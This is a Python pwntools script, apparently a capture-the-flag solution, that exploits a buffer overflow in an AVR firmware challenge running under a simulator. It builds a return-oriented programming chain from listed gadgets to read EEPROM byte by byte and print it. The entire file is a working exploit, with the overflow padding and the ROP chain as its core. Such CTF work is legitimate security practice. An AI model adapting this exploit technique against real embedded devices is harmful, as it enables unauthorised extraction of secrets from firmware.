from pwn import *
import time

context.timeout = 1.0

#p = serialtube('/tmp/simavr-uart0',9600,convert_newlines=False)
#p = serialtube('/dev/ttyACM0',9600,convert_newlines=False)
p = process("./src_simulator/simulator ./src/chall24.hex 2> /dev/null",shell=True)

def readChar(X):

	p.recvuntil('> ')

	x = [b"A"*32] * 32

	# Sploit setup
	x[-3] = b'C'*10            # alignment
	x[-2] = b'B'*10            # alignment

	'''
	     354:	ce 01       	movw	r24, r28
	     356:	df 91       	pop	r29
	     358:	cf 91       	pop	r28
	     35a:	08 95       	ret
	'''

	rop = b''
	rop += struct.pack('>HH',  0x356//2, X) # r29:28 := X
	rop += struct.pack('>HH', 0x354//2,0x4141)  # r25:24 := r29:28
	rop += struct.pack('>H', 0x1116//2) # r24 = eeprom_read_byte(r25:r24)
	rop += struct.pack('>H', 0x726//2)  # putchar(r24) + exit(1)
	x[-1] = rop
	# end sploit



	l = x[-1]
	for e in x[:-1][::-1]:
		l = [e, l]

	m = repr(l).replace("b'","'").replace("'",'"').encode()

	m = m.replace(b']',b'')

	p.send(m)
	c = p.recvuntil(b'> ', timeout=3)
	return c[:1]

data = b''

while True:
	data += readChar(len(data))
	print(repr(data))
